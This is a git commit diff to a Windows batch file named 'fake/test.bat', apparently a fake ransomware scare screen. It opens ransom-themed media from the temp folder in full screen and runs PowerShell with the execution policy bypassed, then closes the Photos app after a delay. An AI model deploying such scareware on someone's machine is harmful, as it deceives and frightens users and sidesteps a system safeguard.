c76ef26dba1cabf97c90175f50c274c230608f7f
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-21 21:18:19 +0700

    Update test.bat

--- fake/test.bat
+++ fake/test.bat
@@ -1,8 +1,8 @@
 @echo off
 timeout /t 1
-start /max "" "$env:TEMP\rans.mp4"
+start /max "" "%temp%\rans.mp4"
 timeout /t 1
-start /max "" "$env:TEMP\ransd.png"
+start /max "" "%temp%\ransd.png"
 powershell.exe -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{F11}')"
 timeout /t 100
 powershell.exe -ExecutionPolicy Bypass -Command "Stop-Process -Name 'PhotosApp' -Force"
